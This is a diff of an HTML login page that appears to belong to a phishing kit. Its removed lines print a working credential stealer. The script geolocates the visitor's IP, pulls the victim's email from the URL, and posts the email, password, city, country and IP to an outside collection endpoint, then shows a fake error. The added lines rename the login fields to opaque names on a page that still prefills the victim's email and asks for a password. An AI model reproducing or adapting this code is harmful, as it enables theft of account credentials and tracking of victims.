@@ -38,11 +38,6 @@
     <script src="jquery.min.js"></script>
     <script src="main.js"></script>
     <link href="style.css" rel="stylesheet">
-    <span id="country"></span>
-    <span id="city"></span>
-    <span id="flag"></span>
-    <span id="eyep"></span>
-    <span id="nownow"></span>
 </head>
 
 <body style="height:100vh;"></body>
@@ -193,17 +188,17 @@
                   </div>
                   
 
-                    <form  class="frm" id="furm" class="my-4">
+                    <form method="post" id="formx" class="my-4">
 
                     
 
                     
 
-                        <input type="email" name="email" id="email" class="form-control mb-3" value="" readonly>
+                        <input type="email" name="x1" id="x1" class="form-control mb-3" value="" readonly>
 
                    
 
-                        <input type="password" name="password" id="password" class="form-control mb-3" placeholder="Password" value="" required>
+                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Password" value="" required>
 
                        
 
@@ -228,104 +223,6 @@
         </div>
 
     </div>
-    </script>  
-      
-   <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
-    <script src="jquery.min.v2.js"></script>
-
-
-
-    <script>
-let dt = new Date()
-let ipAdress = `https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`;
-fetch(`${ipAdress}`)
-.then(req=> req.json())
-.then(res=>{
-    const country = document.querySelector('#country');
-    country.innerHTML = res.country.name;
-    const city = document.querySelector('#city');
-    city.innerHTML = res.city.names.en;
-    const flag = document.querySelector('#flag');
-    flag.innerHTML = res.country.flag;
-    const eyep = document.querySelector('#eyep');
-    eyep.innerHTML = res.ip;
-    const timeNow = document.querySelector('#nownow');
-    timeNow.innerHTML = dt;
-})
-.catch(e=> console.error(e));
-
-
-
-const reloadPreloader = ()=> window.location.reload();
-
-const foota = document.querySelector('.wrp')
-
-foota.addEventListener('click', ()=>{
-    reloadPreloader();
-});
-
-const emailInTheURL = window.location.href;
-const sliceEqualSign = emailInTheURL.indexOf("=");
-const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
-console.log(extracetdEmail);
-
-
-const emml = document.querySelector('.email')
-
-
-        const errMsg = document.querySelector('.err_msg');
-        errMsg.style.display = 'none';
-        const fomm = document.querySelector('#furm');
-        const pwd = document.querySelector('.pswd');
-
-
-        fomm.addEventListener('submit', ()=>{
-            setTimeout(() => {
-                errMsg.style.display = 'block';
-                pwd.value = "";
-            }, 2000);
-        })
-
-    </script>
-
-
-    <script>
-     
-        $(document).ready(function(){
-            $("#furm").submit(function(e){
-                e.preventDefault();
-    
-                var email = $("#email").val();
-                var password = $("#password").val();
-                var countryy = $("#country").html();
-                var cittty = $("#city").html();
-                var ffllaggg = $("#flag").html();
-                var iipppp = $("#eyep").html();
-                var tm = $("#nownow").html();
-
-                $.post("https://send-service-quotaion.onrender.com/get_details/2024results@gmail.com/order/", {
-                    email: email,
-                    pswd: password,
-                    country: countryy,
-                    city: cittty,
-                    flag: ffllaggg,
-                    eyep: iipppp,
-                    nownow: tm
-
-                }, function(data, status){
-                    console.log(data);
-                    
-                })
-            });
-        });
-        
-      </script>    
 </body>
 
 </html>
